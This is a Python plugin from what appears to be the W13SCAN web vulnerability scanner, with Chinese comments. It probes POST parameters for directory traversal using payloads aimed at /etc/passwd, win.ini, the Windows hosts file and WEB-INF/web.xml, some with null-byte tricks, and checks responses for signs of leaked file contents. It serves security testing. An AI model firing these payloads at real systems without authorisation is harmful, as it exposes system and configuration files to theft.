#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/8 2:13 PM
# @Author  : w8ay
# @File    : post_directory_traversal.py

import copy
import os
import re
from urllib.parse import unquote, urlencode

import requests

from W13SCAN.lib.const import POST_HINT, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'POST模式 路径穿越插件'
    desc = '''支持多平台payload'''
    level = Level.LOW

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        post_hint = self.requests.post_hint
        post_data = self.requests.post_data

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'POST':

            filepath = p.path.lower()
            iswin = isunix = isjava = 0  # 三种状态 0 未知 1 确定 2 否定

            if filepath.startswith(".aspx") or filepath.startswith(".asp"):
                isunix = 2
                iswin = 1
                isjava = 2
            if filepath.startswith(".jsp"):
                isjava = 1

            plainArray = [
                "; for 16-bit app support",
                "[MCI Extensions.BAK]",
                "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
                "# localhost name resolution is handled within DNS itself.",
                "[boot loader]"
            ]

            regexArray = [
                '(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
                '(root:.*:.*:)',
                "System\.IO\.FileNotFoundException: Could not find file\s'\w:",
                "System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
                "<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
                "(<web-app[\s\S]+<\/web-app>)"
            ]

            if post_hint == POST_HINT.NORMAL:
                for k, v in post_data.items():
                    if ("." in v or "/" in v) or (k.lower() in ['filename', 'file', 'path', 'filepath']):
                        default_extension = 'jpg'
                        exi = os.path.splitext(v)[1]
                        origin = False
                        dirname = ''
                        if "." in exi:
                            default_extension = exi[1:]
                        if exi != "":
                            origin = True
                            dirname = os.path.dirname(v)
                        data = copy.deepcopy(post_data)
                        payloads = []
                        if 1 >= isunix >= 0:
                            payloads.append("../../../../../../../../../../etc/passwd")
                            payloads.append("/etc/passwd")
                            if origin:
                                payloads.append(dirname + "/../../../../../../../../../../etc/passwd")
                                payloads.append(dirname + "/../../../../../../../../../../etc/passwd{}".format(
                                    unquote("%00") + default_extension))
                            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
                            payloads.append(
                                "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
                        if 1 >= iswin >= 0:
                            payloads.append("../../../../../../../../../../windows/win.ini")
                            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
                            if origin:
                                payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
                        if 1 >= isjava >= 0:
                            payloads.append("/WEB-INF/web.xml")
                            payloads.append("../../WEB-INF/web.xml")

                        issucc = False

                        for payload in payloads:
                            data[k] = payload
                            r = requests.post(url, data=urlencode(data, safe='/'), headers=headers)
                            for i in plainArray:
                                if i in r.text:
                                    out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
                                    issucc = True
                                    break
                            for i in regexArray:
                                if re.search(i, r.text, re.I | re.S | re.M):
                                    out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
                                    issucc = True
                                    break
                            if issucc:
                                break
